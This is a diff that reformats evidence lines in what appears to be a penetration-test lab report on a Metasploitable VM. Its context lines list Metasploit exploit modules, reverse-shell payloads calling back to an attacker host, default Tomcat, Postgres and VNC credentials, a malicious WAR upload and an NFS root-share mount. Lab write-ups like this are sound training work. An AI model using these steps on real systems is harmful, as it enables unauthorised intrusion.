@@ -51,7 +51,7 @@ Initial network discovery and port scanning against the target VM at `192.168.1.
   4. Set the payload explicitly: `set PAYLOAD cmd/unix/reverse_netcat`.
   5. Ran the module (`run`) — a command shell session opened at `2026-09-28 18:25:37`.
   6. Verified identity with `whoami` (→ `root`) and `id` (→ `uid=0(root) gid=0(root)`).
-* **Evidence:** `evidence/exploit4.png`
+  evidence/exploit4.png
 * **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
 * **Outcome / Impact:** Full root shell access obtained on the target machine, confirmed via `whoami`/`id`.
 
@@ -68,7 +68,7 @@ Initial network discovery and port scanning against the target VM at `192.168.1.
   2. Set `RHOSTS 192.168.1.3` and `LHOST 192.168.1.4`.
   3. Ran the module — Metasploit registered a fake IRC user (`clark`) and reported the target as vulnerable ("UnrealIRCd detected via IRC commands"), sent the backdoor command, but returned **"Exploit completed, but no session was created."**
   4. Set `PAYLOAD cmd/unix/reverse` and `ExitOnSession false`, then re-ran with a second fake user (`nora`) — same vulnerable detection, same result: no session created.
-* **Evidence:** `evidence/exploit3.png`
+     evidence/exploit3.png
 * **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation *(not achieved: Installation, C2, Actions on Objectives)*
 * **Outcome / Impact:** The service was confirmed vulnerable (banner/detection check passed) and the backdoor trigger was sent twice, but **no working shell was obtained** in this run. No code execution was demonstrated.
 
@@ -84,7 +84,7 @@ Initial network discovery and port scanning against the target VM at `192.168.1.
   1. Selected the module: `use exploit/multi/http/tomcat_mgr_upload`.
   2. Set `RHOSTS 192.168.1.3`, `RPORT 8180`, `HttpUsername tomcat`, `HttpPassword tomcat`, and `LHOST 192.168.1.4`.
   3. Ran the module — it authenticated successfully, uploaded and deployed a WAR (`Ol2UvMzRkWqozwfktX4`), then automatically undeployed it, returning **"Exploit completed, but no session was created."**
-* **Evidence:** `evidence/exploit6.png`
+  evidence/exploit6.png
 * **Cyber Kill Chain Stage(s):** Exploitation *(authentication succeeded)*, Installation *(WAR uploaded/deployed)* — **not achieved: C2**
 * **Outcome / Impact:** Default administrative credentials were confirmed valid and a malicious WAR was successfully deployed to the server, but **no reverse shell session was captured** in this run.
 
@@ -101,7 +101,7 @@ Initial network discovery and port scanning against the target VM at `192.168.1.
   2. Set `RHOSTS 192.168.1.3`, `USERNAME postgres`, `PASSWORD postgres`, `LHOST 192.168.1.4`.
   3. Ran the module — uploaded `/tmp/CApNekeB.so` and opened Meterpreter session 3 at `2026-09-28 18:39:00`.
   4. Confirmed access with `getuid` (→ `postgres`) and `sysinfo` (Metasploitable, Ubuntu 8.04, i686).
-* **Evidence:** `evidence/exploit7.png`
+  evidence/exploit7.png
 * **Cyber Kill Chain Stage(s):** Exploitation, C2
 * **Outcome / Impact:** System access obtained under the `postgres` security context, confirmed via `getuid`/`sysinfo`.
 
@@ -119,7 +119,7 @@ Initial network discovery and port scanning against the target VM at `192.168.1.
   3. Switched payload: `set PAYLOAD cmd/unix/reverse_perl`, re-ran the module — a command shell session opened at `2026-09-28 18:42:39`.
   4. Verified access with `whoami` (→ `daemon`) and `id` (→ `uid=1(daemon) gid=1(daemon)`).
   5. Pivoted to further enumeration: ran `showmount -e 192.168.1.3` to list NFS exports, mounted the exported root share (`sudo mount -t nfs 192.168.1.3:/ /mnt/nfs`), and listed its full contents (`ls -la /mnt/nfs`) before unmounting.
-* **Evidence:** `evidence/exploit8.png` (shell access as `daemon`). NFS enumeration: `evidence/exploit9.png`.
+  evidence/exploit8.png (shell access as `daemon`). NFS enumeration: `evidence/exploit9.png`.
 * **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
 * **Outcome / Impact:** Daemon-level code execution obtained (after switching payloads), followed by full filesystem enumeration via an exposed NFS share mounted from the attacker box.
 
@@ -135,7 +135,7 @@ Initial network discovery and port scanning against the target VM at `192.168.1.
   1. Selected and ran the scanner: `use auxiliary/scanner/vnc/vnc_login`, `set RHOSTS 192.168.1.3`, `run` — recovered the password **`password`** ("Login Successful: :password").
   2. First connection attempt (`vncviewer 192.168.1.3`) without the password failed ("Authentication failure").
   3. Reconnected and supplied the recovered password — authentication succeeded, revealing desktop name `"root's X desktop (metasploitable:0)"`.
-* **Evidence:** `evidence/exploit10.png` (scanner result + successful vncviewer authentication). Visual confirmation of the live session: `evidence/exploit10_evidence.png` (VirtualBox screenshot showing the open root shell inside the VNC desktop window).
+  evidence/exploit10.png (scanner result + successful vncviewer authentication). Visual confirmation of the live session: `evidence/exploit10_evidence.png` (VirtualBox screenshot showing the open root shell inside the VNC desktop window).
 * **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives
 * **Outcome / Impact:** Full graphical administrative desktop session control (root's X desktop) confirmed visually.
 
